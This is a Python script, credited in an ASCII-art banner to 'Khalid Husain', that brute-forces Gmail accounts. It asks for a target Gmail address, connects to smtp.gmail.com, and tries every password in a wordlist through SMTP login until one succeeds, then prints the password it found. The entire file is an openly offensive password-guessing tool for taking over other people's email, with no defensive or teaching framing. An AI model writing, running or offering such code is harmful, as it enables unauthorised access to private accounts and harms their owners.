import smtplib

from os import system

def artwork():

    print("\n")

    print("##########################################################")

    print("#                                                        #")

    print("#                     \||/                               #")

    print("#                     |  @___oo                          #")

    print("#           /\  /\   / (__,,,,|                          #")

    print("#          ) /^\) ^\/ _)                CoderBoy         #")

    print("#          )   /^\/   _)                CoDeD By:        #")

    print("#          )   _𝕊𝕙𝕚𝕧𝕒𝕟𝕚 /  / _)         Khalid Husain.    #")

    print("#      /\  )/\/ |𝕋𝕙𝕒𝕜𝕦𝕣|  | )_)                           #")

    print("#     <  >      |(,,) )__)                               #")

    print("#      ||      /    \)___)\                              #")

    print("#      | \____(      )___) )___                          #")

    print("#      \______(_______;;; __;;;                          #")

    print("#                                                        #")

    print("##########################################################")

    print("\n")

artwork()

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)

smtpserver.ehlo()

smtpserver.starttls()

user = input("Enter The Target Gmail Adress => ")

print("\n")

pwd = input("Enter '0' to use the inbuilt passwords list \nEnter '2' to Add a custom password list\n => ")

if pwd=='0':

    passswfile="khalid.txt"

else :

    print("\n")

    passswfile = input("Name The File Path (For Password List) => ")

passswfile = open(passswfile, "r")

for password in passswfile:

    try:

        smtpserver.login(user, password)

        print("[+] Password Found %s" % password)

        break

    except smtplib.SMTPAuthenticationError:

        print("[!] Pasword . %s " % password)
